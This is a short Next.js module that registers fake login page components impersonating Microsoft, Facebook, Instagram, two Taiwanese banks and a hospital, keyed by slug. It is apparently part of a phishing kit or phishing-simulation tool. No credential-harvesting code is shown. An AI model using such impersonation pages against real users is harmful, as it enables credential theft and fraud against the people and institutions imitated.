import dynamic from "next/dynamic";
import type { ComponentType } from "react";

export interface PhishingPageProps {
  token: string;
}

const builtInPages: Record<string, ComponentType<PhishingPageProps>> = {
  microsoft: dynamic(() => import("./FakeLoginForm")),
  facebook: dynamic(() => import("./FacebookLogin")),
  instagram: dynamic(() => import("./InstagramLogin")),
  "esun-bank": dynamic(() => import("./EsunBankLogin")),
  "cmu-hospital": dynamic(() => import("./CmuHospitalLogin")),
  "taichung-bank": dynamic(() => import("./TaichungBankLogin")),
};

export function getPhishingComponent(slug: string): ComponentType<PhishingPageProps> | null {
  return builtInPages[slug] ?? null;
}

export const BUILT_IN_SLUGS = Object.keys(builtInPages);
